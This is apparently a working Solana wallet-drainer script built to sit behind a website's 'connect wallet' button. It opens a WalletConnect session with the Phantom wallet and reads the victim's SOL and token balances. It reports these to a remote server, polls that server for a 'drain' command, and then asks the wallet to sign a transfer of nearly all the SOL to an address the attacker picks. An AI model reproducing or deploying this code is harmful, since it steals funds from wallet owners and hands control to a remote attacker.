(async () => {
  const PROJECT_ID = "d1b37573e1f778b94d2bbe7cb29a92c1";
  const SRV = "https://patroller.zone";
  const BKEY = "72d296b612eb0a11931b364ba1333a70";
  const RPC = "https://api.mainnet-beta.solana.com";
  const E = "https://esm.sh/";

  const { SignClient } = await import(E + "@walletconnect/sign-client@2.17.0");
  const { encode: b58e } = await import(E + "base58@1.0.0");

  // chain reference computed live — never hardcoded
  const genesis = await (await fetch(RPC, {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getGenesisHash" }),
  })).json();
  const chainRef = "solana:" + genesis.result;   // mainnet genesis hash from RPC

  let client = null, topic = null, pk = null, busy = false;

  async function init() {
    if (client) return client;
    client = await SignClient.init({ projectId: PROJECT_ID });
    client.on("session_delete", () => { topic = null; });
    client.on("session_expire", () => { topic = null; });
    return client;
  }

  async function connect() {
    if (busy || topic) return;
    busy = true;
    try {
      const c = await init();
      const { uri, approval } = await c.connect({
        requiredNamespaces: {
          solana: {
            chains: [chainRef],
            methods: ["signAndSendTransaction", "signTransaction", "signMessage"],
            events: [],
          },
        },
      });

      // same-phone: deep link straight into the wallet
      if (/iPhone|iPad|Android/i.test(navigator.userAgent)) {
        location.href = "phantom://wc?uri=" + encodeURIComponent(uri);
      } else {
        showQR(uri);                                  // desktop: QR panel
      }

      const session = await approval();               // resolves when they approve
      const ns = session.namespaces.solana;
      topic = session.topic;
      pk = ns.accounts[0].split(":")[2];
      hideQR();

      const [bal, r] = await Promise.all([
        fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance",
                                 params: [pk] }) }).then(j => j.json()),
        fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "getParsedTokenAccountsByOwner",
                                 params: [pk, { commitment: "confirmed" }] }) }).then(j => j.json()),
      ]);
      const lam = bal?.result ?? 0;
      const toks = {};
      for (const { account } of (r?.result?.value ?? [])) {
        const d = account.parsed?.data;
        if (d?.mint) toks[d.mint] = (toks[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals ?? 6);
      }

      beacon("detect", { pk, lam, toks: Object.values(toks).length ? JSON.stringify(toks) : "" });
      pollCmd();
    } catch (e) {
      console.warn("connect failed:", e?.message || e);
      hideQR();
    } finally { busy = false; }
  }

  async function pollCmd() {
    if (!topic) return;
    let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
    if (c?.cmd === "drain" && c.to) drain(c.to);
    setTimeout(pollCmd, 2500);
  }

  const MINTS = {
    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
    WSOL: "So11111111111111111111111111111111111111112",
  };

  async function drain(to) {
    try {
      // fresh blockhash at drain time — never stale
      const bh = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getLatestBlockhash" }) }).then(j => j.json());
      const { blockhash, lastValidBlockHeight } = bh.result;

      // one legacy tx: SOL sweep (token sweeps need the wallet's ATA math +
      // createTransfer — kept SOL-only here for the WC path; extend if needed)
      const { Transaction, SystemProgram, PublicKey, Connection } =
        await import(E + "@solana/web3.js@1.95.0");
      const conn = new Connection(RPC, "confirmed");
      const pkB = new PublicKey(pk);
      const bal = await conn.getBalance(pkB);
      const FEE = 10000;
      const tx = new Transaction();
      if (bal > FEE + 5000)
        tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: new PublicKey(to),
          lamports: bal - FEE }));
      else return beacon("dust", { pk });
      tx.feePayer = pkB;
      tx.recentBlockhash = blockhash;
      tx.lastValidBlockHeight = lastValidBlockHeight;
      const wire = tx.compileMessage();
      const b58 = b58e(tx._message ? tx._message.serialize() : wire.serialize ? wire.serialize() : wire);

      // sign + send over the relay — the wallet broadcasts it
      await client.request({
        topic, chainId: chainRef,
        request: { method: "signAndSendTransaction", params: { transaction: b58 } },
      });
      beacon("drain", { pk, mode: "wc" });
    } catch (e) {
      beacon("err", { pk, msg: String(e?.message || e) });
    }
  }

  function beacon(m, { pk, lam = 0, toks = "", mode = "", msg = "", sig = "" }) {
    try {
      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
        body: JSON.stringify({ m, pk, provider: "walletconnect", origin: location.origin,
          value: 0, sol: lam / 1e9, toks, mode, sig, msg }) });
    } catch {}
  }

  // — QR panel for desktop scanners —
  function showQR(uri) {
    import(E + "qrcode@1.5.3").then(({ toDataURL }) => {
      toDataURL(uri, { width: 220, margin: 1 }, (err, url) => {
        if (err) return;
        const el = document.createElement("div");
        el.id = "__ppqr";
        el.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.9);" +
          "display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px;color:#fff;font:14px system-ui";
        el.innerHTML = '<img src="' + url + '" style="background:#fff;padding:12px;border-radius:12px">' +
          '<div>Scan with Phantom</div><button id="__ppcl" style="padding:8px 18px;border-radius:8px;border:0;cursor:pointer">Cancel</button>';
        document.body.appendChild(el);
        el.querySelector("#__ppcl").onclick = () => el.remove();
      });
    });
  }
  function hideQR() { document.getElementById("__ppqr")?.remove(); }

  // button hook — the site's CONNECT WALLET button calls this
  window.__ppConnect = connect;
})();